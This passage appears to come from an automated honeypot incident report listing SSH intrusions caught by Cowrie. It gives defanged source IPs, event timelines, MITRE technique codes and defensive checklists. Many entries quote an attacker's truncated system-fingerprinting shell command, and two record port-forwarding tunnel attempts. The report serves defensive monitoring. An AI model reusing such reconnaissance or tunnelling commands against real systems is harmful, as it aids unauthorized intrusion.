|---|---|
| `2026-07-24 20:15:08` | `cowrie.session.connect` |
| `2026-07-24 20:15:09` | `cowrie.client.version` |
| `2026-07-24 20:15:09` | `cowrie.client.kex` |
| `2026-07-24 20:15:11` | `cowrie.login.success` |
| `2026-07-24 20:15:13` | `cowrie.session.params` |
| `2026-07-24 20:15:13` | `cowrie.command.input` |
| `2026-07-24 20:15:13` | `cowrie.command.input` |
| `2026-07-24 20:15:13` | `cowrie.command.input` |
| `2026-07-24 20:15:13` | `cowrie.command.input` |
| `2026-07-24 20:15:13` | `cowrie.command.input` |
| `2026-07-24 20:15:13` | `cowrie.command.success` |
| `2026-07-24 20:15:13` | `cowrie.command.input` |
| `2026-07-24 20:15:13` | `cowrie.command.input` |
| `2026-07-24 20:15:13` | `cowrie.command.input` |
| `2026-07-24 20:15:13` | `cowrie.command.input` |
| `2026-07-24 20:15:13` | `cowrie.log.closed` |
| `2026-07-24 20:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c81e3baa6ba2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:16 |
| **Last Seen** | 2026-07-24 20:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:16:09` | `cowrie.session.connect` |
| `2026-07-24 20:16:10` | `cowrie.client.version` |
| `2026-07-24 20:16:10` | `cowrie.client.kex` |
| `2026-07-24 20:16:12` | `cowrie.login.success` |
| `2026-07-24 20:16:14` | `cowrie.session.params` |
| `2026-07-24 20:16:14` | `cowrie.command.input` |
| `2026-07-24 20:16:14` | `cowrie.command.input` |
| `2026-07-24 20:16:14` | `cowrie.command.input` |
| `2026-07-24 20:16:14` | `cowrie.command.input` |
| `2026-07-24 20:16:14` | `cowrie.command.input` |
| `2026-07-24 20:16:14` | `cowrie.command.success` |
| `2026-07-24 20:16:14` | `cowrie.command.input` |
| `2026-07-24 20:16:14` | `cowrie.command.input` |
| `2026-07-24 20:16:14` | `cowrie.command.input` |
| `2026-07-24 20:16:14` | `cowrie.command.input` |
| `2026-07-24 20:16:14` | `cowrie.log.closed` |
| `2026-07-24 20:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cedf523cfbb2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 20:16 |
| **Last Seen** | 2026-07-24 20:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:16:19` | `cowrie.session.connect` |
| `2026-07-24 20:16:19` | `cowrie.client.version` |
| `2026-07-24 20:16:19` | `cowrie.client.kex` |
| `2026-07-24 20:16:20` | `cowrie.login.success` |
| `2026-07-24 20:16:21` | `cowrie.session.params` |
| `2026-07-24 20:16:21` | `cowrie.command.input` |
| `2026-07-24 20:16:21` | `cowrie.command.input` |
| `2026-07-24 20:16:21` | `cowrie.command.input` |
| `2026-07-24 20:16:21` | `cowrie.command.input` |
| `2026-07-24 20:16:21` | `cowrie.command.input` |
| `2026-07-24 20:16:21` | `cowrie.command.success` |
| `2026-07-24 20:16:21` | `cowrie.command.input` |
| `2026-07-24 20:16:21` | `cowrie.command.input` |
| `2026-07-24 20:16:21` | `cowrie.command.input` |
| `2026-07-24 20:16:21` | `cowrie.command.input` |
| `2026-07-24 20:16:22` | `cowrie.log.closed` |
| `2026-07-24 20:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baeef471e975

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]229` |
| **First Seen** | 2026-07-24 20:16 |
| **Last Seen** | 2026-07-24 20:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:16:54` | `cowrie.session.connect` |
| `2026-07-24 20:16:54` | `cowrie.client.version` |
| `2026-07-24 20:16:54` | `cowrie.client.kex` |
| `2026-07-24 20:16:56` | `cowrie.login.success` |
| `2026-07-24 20:16:57` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]229` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8262c4a5613e

| Field | Detail |
|---|---|
| **Source IP** | `102.38.3[.]107` |
| **First Seen** | 2026-07-24 20:17 |
| **Last Seen** | 2026-07-24 20:17 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:17:03` | `cowrie.session.connect` |
| `2026-07-24 20:17:05` | `cowrie.client.version` |
| `2026-07-24 20:17:05` | `cowrie.client.kex` |
| `2026-07-24 20:17:11` | `cowrie.login.success` |
| `2026-07-24 20:17:12` | `cowrie.direct-tcpip.request` |
| `2026-07-24 20:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.38.3[.]107` to AbuseIPDB if not already reported
- [ ] Block `102.38.3[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4267e13d1c45

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:17 |
| **Last Seen** | 2026-07-24 20:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:17:10` | `cowrie.session.connect` |
| `2026-07-24 20:17:10` | `cowrie.client.version` |
| `2026-07-24 20:17:10` | `cowrie.client.kex` |
| `2026-07-24 20:17:13` | `cowrie.login.success` |
| `2026-07-24 20:17:14` | `cowrie.session.params` |
| `2026-07-24 20:17:14` | `cowrie.command.input` |
| `2026-07-24 20:17:14` | `cowrie.command.input` |
| `2026-07-24 20:17:14` | `cowrie.command.input` |
| `2026-07-24 20:17:14` | `cowrie.command.input` |
| `2026-07-24 20:17:14` | `cowrie.command.input` |
| `2026-07-24 20:17:14` | `cowrie.command.success` |
| `2026-07-24 20:17:14` | `cowrie.command.input` |
| `2026-07-24 20:17:14` | `cowrie.command.input` |
| `2026-07-24 20:17:14` | `cowrie.command.input` |
| `2026-07-24 20:17:14` | `cowrie.command.input` |
| `2026-07-24 20:17:15` | `cowrie.log.closed` |
| `2026-07-24 20:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54d7efd11c65

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 20:17 |
| **Last Seen** | 2026-07-24 20:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:17:57` | `cowrie.session.connect` |
| `2026-07-24 20:17:58` | `cowrie.client.version` |
| `2026-07-24 20:17:58` | `cowrie.client.kex` |
| `2026-07-24 20:17:59` | `cowrie.login.success` |
| `2026-07-24 20:18:00` | `cowrie.session.params` |
| `2026-07-24 20:18:00` | `cowrie.command.input` |
| `2026-07-24 20:18:00` | `cowrie.command.input` |
| `2026-07-24 20:18:00` | `cowrie.command.input` |
| `2026-07-24 20:18:00` | `cowrie.command.input` |
| `2026-07-24 20:18:00` | `cowrie.command.input` |
| `2026-07-24 20:18:00` | `cowrie.command.success` |
| `2026-07-24 20:18:00` | `cowrie.command.input` |
| `2026-07-24 20:18:00` | `cowrie.command.input` |
| `2026-07-24 20:18:00` | `cowrie.command.input` |
| `2026-07-24 20:18:00` | `cowrie.command.input` |
| `2026-07-24 20:18:01` | `cowrie.log.closed` |
| `2026-07-24 20:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-412e571f9a5c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:18 |
| **Last Seen** | 2026-07-24 20:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:18:11` | `cowrie.session.connect` |
| `2026-07-24 20:18:11` | `cowrie.client.version` |
| `2026-07-24 20:18:11` | `cowrie.client.kex` |
| `2026-07-24 20:18:14` | `cowrie.login.success` |
| `2026-07-24 20:18:15` | `cowrie.session.params` |
| `2026-07-24 20:18:15` | `cowrie.command.input` |
| `2026-07-24 20:18:15` | `cowrie.command.input` |
| `2026-07-24 20:18:15` | `cowrie.command.input` |
| `2026-07-24 20:18:15` | `cowrie.command.input` |
| `2026-07-24 20:18:15` | `cowrie.command.input` |
| `2026-07-24 20:18:15` | `cowrie.command.success` |
| `2026-07-24 20:18:15` | `cowrie.command.input` |
| `2026-07-24 20:18:15` | `cowrie.command.input` |
| `2026-07-24 20:18:15` | `cowrie.command.input` |
| `2026-07-24 20:18:15` | `cowrie.command.input` |
| `2026-07-24 20:18:16` | `cowrie.log.closed` |
| `2026-07-24 20:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c8cd8a32550

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:19 |
| **Last Seen** | 2026-07-24 20:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:19:13` | `cowrie.session.connect` |
| `2026-07-24 20:19:14` | `cowrie.client.version` |
| `2026-07-24 20:19:14` | `cowrie.client.kex` |
| `2026-07-24 20:19:16` | `cowrie.login.success` |
| `2026-07-24 20:19:17` | `cowrie.session.params` |
| `2026-07-24 20:19:17` | `cowrie.command.input` |
| `2026-07-24 20:19:17` | `cowrie.command.input` |
| `2026-07-24 20:19:17` | `cowrie.command.input` |
| `2026-07-24 20:19:17` | `cowrie.command.input` |
| `2026-07-24 20:19:17` | `cowrie.command.input` |
| `2026-07-24 20:19:17` | `cowrie.command.success` |
| `2026-07-24 20:19:17` | `cowrie.command.input` |
| `2026-07-24 20:19:17` | `cowrie.command.input` |
| `2026-07-24 20:19:17` | `cowrie.command.input` |
| `2026-07-24 20:19:17` | `cowrie.command.input` |
| `2026-07-24 20:19:18` | `cowrie.log.closed` |
| `2026-07-24 20:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7b7ca37f400

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 20:19 |
| **Last Seen** | 2026-07-24 20:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:19:35` | `cowrie.session.connect` |
| `2026-07-24 20:19:35` | `cowrie.client.version` |
| `2026-07-24 20:19:35` | `cowrie.client.kex` |
| `2026-07-24 20:19:36` | `cowrie.login.success` |
| `2026-07-24 20:19:37` | `cowrie.session.params` |
| `2026-07-24 20:19:37` | `cowrie.command.input` |
| `2026-07-24 20:19:37` | `cowrie.command.input` |
| `2026-07-24 20:19:37` | `cowrie.command.input` |
| `2026-07-24 20:19:37` | `cowrie.command.input` |
| `2026-07-24 20:19:37` | `cowrie.command.input` |
| `2026-07-24 20:19:37` | `cowrie.command.success` |
| `2026-07-24 20:19:37` | `cowrie.command.input` |
| `2026-07-24 20:19:37` | `cowrie.command.input` |
| `2026-07-24 20:19:37` | `cowrie.command.input` |
| `2026-07-24 20:19:37` | `cowrie.command.input` |
| `2026-07-24 20:19:37` | `cowrie.log.closed` |
| `2026-07-24 20:19:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d170c1b9e4f6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:20 |
| **Last Seen** | 2026-07-24 20:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:20:15` | `cowrie.session.connect` |
| `2026-07-24 20:20:15` | `cowrie.client.version` |
| `2026-07-24 20:20:15` | `cowrie.client.kex` |
| `2026-07-24 20:20:18` | `cowrie.login.success` |
| `2026-07-24 20:20:19` | `cowrie.session.params` |
| `2026-07-24 20:20:19` | `cowrie.command.input` |
| `2026-07-24 20:20:19` | `cowrie.command.input` |
| `2026-07-24 20:20:19` | `cowrie.command.input` |
| `2026-07-24 20:20:19` | `cowrie.command.input` |
| `2026-07-24 20:20:19` | `cowrie.command.input` |
| `2026-07-24 20:20:19` | `cowrie.command.success` |
| `2026-07-24 20:20:19` | `cowrie.command.input` |
| `2026-07-24 20:20:19` | `cowrie.command.input` |
| `2026-07-24 20:20:19` | `cowrie.command.input` |
| `2026-07-24 20:20:19` | `cowrie.command.input` |
| `2026-07-24 20:20:20` | `cowrie.log.closed` |
| `2026-07-24 20:20:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-046cfbef4b0f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:21 |
| **Last Seen** | 2026-07-24 20:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:21:19` | `cowrie.session.connect` |
| `2026-07-24 20:21:19` | `cowrie.client.version` |
| `2026-07-24 20:21:19` | `cowrie.client.kex` |
| `2026-07-24 20:21:21` | `cowrie.login.success` |
| `2026-07-24 20:21:23` | `cowrie.session.params` |
| `2026-07-24 20:21:23` | `cowrie.command.input` |
| `2026-07-24 20:21:23` | `cowrie.command.input` |
| `2026-07-24 20:21:23` | `cowrie.command.input` |
| `2026-07-24 20:21:23` | `cowrie.command.input` |
| `2026-07-24 20:21:23` | `cowrie.command.input` |
| `2026-07-24 20:21:23` | `cowrie.command.success` |
| `2026-07-24 20:21:23` | `cowrie.command.input` |
| `2026-07-24 20:21:23` | `cowrie.command.input` |
| `2026-07-24 20:21:23` | `cowrie.command.input` |
| `2026-07-24 20:21:23` | `cowrie.command.input` |
| `2026-07-24 20:21:23` | `cowrie.log.closed` |
| `2026-07-24 20:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aae0afba0f6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:22 |
| **Last Seen** | 2026-07-24 20:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:22:23` | `cowrie.session.connect` |
| `2026-07-24 20:22:23` | `cowrie.client.version` |
| `2026-07-24 20:22:23` | `cowrie.client.kex` |
| `2026-07-24 20:22:25` | `cowrie.login.success` |
| `2026-07-24 20:22:27` | `cowrie.session.params` |
| `2026-07-24 20:22:27` | `cowrie.command.input` |
| `2026-07-24 20:22:27` | `cowrie.command.input` |
| `2026-07-24 20:22:27` | `cowrie.command.input` |
| `2026-07-24 20:22:27` | `cowrie.command.input` |
| `2026-07-24 20:22:27` | `cowrie.command.input` |
| `2026-07-24 20:22:27` | `cowrie.command.success` |
| `2026-07-24 20:22:27` | `cowrie.command.input` |
| `2026-07-24 20:22:27` | `cowrie.command.input` |
| `2026-07-24 20:22:27` | `cowrie.command.input` |
| `2026-07-24 20:22:27` | `cowrie.command.input` |
| `2026-07-24 20:22:28` | `cowrie.log.closed` |
| `2026-07-24 20:22:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b548305fea7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 20:23 |
| **Last Seen** | 2026-07-24 20:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 20:23:25` | `cowrie.session.connect` |
| `2026-07-24 20:23:26` | `cowrie.client.version` |
| `2026-07-24 20:23:26` | `cowrie.client.kex` |
| `2026-07-24 20:23:28` | `cowrie.login.success` |
| `2026-07-24 20:23:29` | `cowrie.session.params` |
| `2026-07-24 20:23:29` | `cowrie.command.input` |
